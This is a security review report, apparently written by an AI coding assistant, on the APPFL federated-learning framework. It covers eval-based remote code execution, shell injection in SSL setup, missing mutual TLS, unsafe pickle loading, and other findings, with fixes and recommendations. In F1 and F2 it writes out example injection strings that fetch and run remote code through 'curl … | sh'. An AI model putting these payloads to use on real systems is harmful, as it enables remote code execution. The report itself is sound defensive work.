# APPFL Security Review

**Date:** 2026-06-10
**Scope:** `src/appfl/` — the APPFL federated-learning framework (communication
layers, serialization, authentication, credential/SSL setup, and CLI tooling).
**Reviewer:** Security review pass (Claude Code).

This document records the vulnerabilities identified during a cybersecurity
review of the APPFL code base. Findings are ordered by severity. The
accompanying pull request fixes the two highest-confidence, network-reachable
issues (F1 and F2) and adds regression tests; the remaining findings are
documented with recommendations.

> **Threat-model note.** APPFL is a federated-learning framework. The server
> aggregates model updates from many clients, and clients receive a global
> model and a configuration from the server. In most realistic deployments the
> *clients are not fully trusted* (that is the entire premise of FL), and the
> network may be hostile. Any place where data received from a peer is turned
> into code, a Python object, or a filesystem/shell operation is therefore a
> meaningful attack surface.

---

## F1 — Remote code execution via `eval()` on a network-controlled dtype string (Critical) — FIXED

**Files:**
- `src/appfl/comm/grpc_legacy/grpc_server.py` (lines 198, 204)
- `src/appfl/comm/grpc_legacy/grpc_client.py` (line 82)

**Issue.** Tensor records received over gRPC carry a `data_dtype` string field.
The receiving side resolved it with the Python builtin `eval()`:

```python
flat = np.frombuffer(tensor.data_bytes, dtype=eval(tensor.data_dtype))
```

`data_dtype` is fully attacker-controlled wire data. A malicious peer can set it
to any Python expression, which `eval()` executes in the process with the
privileges of the APPFL server (or client). For example, a client sending a
learning result with
`data_dtype = '__import__("os").system("curl … | sh")'` achieves arbitrary
command execution on the **aggregation server**. The server path
(`send_learning_results`) is reachable by any client that can submit results,
making this a remote, pre-aggregation RCE. The mirrored client path means a
malicious/compromised server can likewise execute code on every client.

**Fix.** Added `parse_tensor_dtype()` in
`src/appfl/comm/grpc_legacy/grpc_utils.py`, which strips the optional `"np."`
prefix that the sender adds (see `construct_tensor_record`) and resolves the
name through `numpy.dtype(...)`. `numpy.dtype` only accepts valid dtype
specifiers and never executes code; anything else raises `ValueError`. All three
call sites now use this helper. Regression tests are in
`tests/test_grpc_legacy_dtype_safety.py`.

---

## F2 — Shell / OpenSSL-config injection via certificate fields in `setup_ssl` (Medium) — FIXED

**File:** `src/appfl/comm/grpc/setup_ssl.py`

**Issue.** `setup_ssl()` prompts the operator for certificate subject and SAN
fields (Country, State, Organization, DNS, IP) and interpolates them verbatim
into (a) a generated `bash` script that is then executed via `subprocess.run`,
and (b) an OpenSSL config file:

```python
-subj "/C={C}/ST={ST}/O={ORG}"
...
DNS.1 = {DNS}
IP.1  = {IP}
```

A value such as `IP = '127.0.0.1"; curl … | sh #'` breaks out of the quoting in
the generated script and runs arbitrary commands. (The directory path was
already hardened against this in a prior pass — finding #6 — but the subject/SAN
fields were not.) Severity is Medium because exploitation requires the operator
to type a malicious value at an interactive prompt; nonetheless the values
should never reach a shell unsanitized.

**Fix.** Added `_SAFE_FIELD_RE` (`^[A-Za-z0-9 ._-]+$`) and a
`_prompt_safe_field()` helper that re-prompts until each field matches the
allow-list, eliminating every shell metacharacter and config-injection
character. Defaults are unchanged.

---

## F3 — gRPC TLS server does not require client certificates (Medium) — documented

**File:** `src/appfl/comm/grpc/serve.py` (lines 84–93)

`grpc.ssl_server_credentials(...)` is called with `root_certificates=...` but
**without** `require_client_auth=True`. Even when a CA certificate is supplied,
the server does not enforce mutual TLS — any client that trusts the server cert
can connect, and authentication relies entirely on the separate bearer-token
authenticator (`use_authenticator`). When an operator provides a CA cert they
almost certainly intend mTLS. **Recommendation:** thread a
`require_client_auth` option through `serve()` (default off for backward
compatibility, but set automatically when `ca_certificate` is provided and no
token authenticator is configured), and document the interaction. Not changed in
this PR to avoid breaking existing token-only deployments without a config
review.

---

## F4 — Untrusted deserialization of model payloads via `torch.load` / `pickle` (High, by design) — documented

**Files (representative):** `src/appfl/comm/grpc/utils.py:29`,
`src/appfl/comm/mpi/serializer.py:55,79`, `src/appfl/agent/server.py:504-508`,
`src/appfl/comm/tes/tes_server_communicator.py:763`,
`src/appfl/compressor/*.py` (`pickle.loads`).

Model parameters are exchanged as `torch.load`/`pickle` byte streams. Both are
unsafe deserializers: a crafted payload executes arbitrary code on load. Because
the server loads client-submitted models (and clients load server-submitted
models), a malicious peer can achieve RCE on the counterparty. This is partly
intrinsic to PyTorch-based FL, and the project already gates some untrusted YAML
behind a `trusted`/`use_authenticator` flag (`deserialize_yaml`). **Recommendations:**
(1) require an authenticator (F3/identity) before accepting model bytes;
(2) migrate weight transfer to `safetensors` (no code execution on load) or use
`torch.load(..., weights_only=True)` on PyTorch ≥ 2.0 wherever a state-dict —
not an arbitrary object — is expected; (3) where `pickle.loads` decompresses
compressor output, document that the channel must be authenticated/integrity
-protected. This is a larger change touching the wire format and is left for a
follow-up, but it is the most important systemic risk after F1.

---

## F5 — `exec()`/`eval()` of configuration-supplied source in `get_executable_func` (Medium) — documented

**File:** `src/appfl/comm/utils/utils.py:5-13`

```python
exec(func_cfg.source, globals())
return eval(func_cfg.call)
```

Loss/metric functions can be provided as raw source in the configuration and are
executed via `exec`/`eval`. Clients receive their configuration from the server
(`GetConfiguration`), so a malicious server can ship a config whose `get_loss.source`
runs arbitrary code on every client. This is "trusted config" by current design,
but the trust boundary (server → client config) is exactly the one FL is meant
to harden. **Recommendation:** prefer the `module`/`call` import path (already
supported) and gate the `source` branch behind an explicit opt-in flag with a
documented warning, mirroring the `trusted=` pattern used for YAML.

---

## F6 — Hardcoded CA passphrase placeholder in generated SSL script (Low) — documented

**File:** `src/appfl/comm/grpc/setup_ssl.py:100` — `CA_PASSWORD=notsafe`

The generated script defines a CA password variable that is unused (the CA key
is generated with `openssl genrsa` **without** `-passout`, so `ca.key` is left
unencrypted on disk). The leftover `notsafe` value is misleading and the
unencrypted CA key is the real exposure. **Recommendation:** either encrypt the
CA key (`-aes256 -passout`) or drop the dead variable and document that `ca.key`
must be protected by filesystem permissions (the directory is already created
0700 by the prior hardening).

---

## Positive observations (already-hardened areas)

A prior security pass had already addressed several issues, which this review
confirms are sound:

- `NaiveAuthenticator` uses `hmac.compare_digest` (constant-time) and enforces a
  16-char minimum token (`src/appfl/login_manager/naive/naive_authenticator.py`).
- `secure_appfl_dir`/`_ensure_secure_dir` create credential directories 0700,
  reject symlinks, and verify ownership (`src/appfl/misc/utils.py`).
- `deserialize_yaml` defaults to `yaml.safe_load` and only falls back to
  `UnsafeLoader` behind a `trusted`/`use_authenticator` flag.
- `setup_ssl` validates the destination directory against a path allow-list and
  uses `subprocess.run([script])` rather than `os.system` (finding #6).
- TES client file handling validates paths against traversal
  (`tests/test_tes_client_safe_paths.py`).

---

## Summary table

| ID | Severity | Status | Location |
|----|----------|--------|----------|
| F1 | Critical | **Fixed** | `comm/grpc_legacy/grpc_{server,client}.py` |
| F2 | Medium   | **Fixed** | `comm/grpc/setup_ssl.py` |
| F3 | Medium   | Documented | `comm/grpc/serve.py` |
| F4 | High (by design) | Documented | model (de)serialization across comm layers |
| F5 | Medium   | Documented | `comm/utils/utils.py` |
| F6 | Low      | Documented | `comm/grpc/setup_ssl.py` |
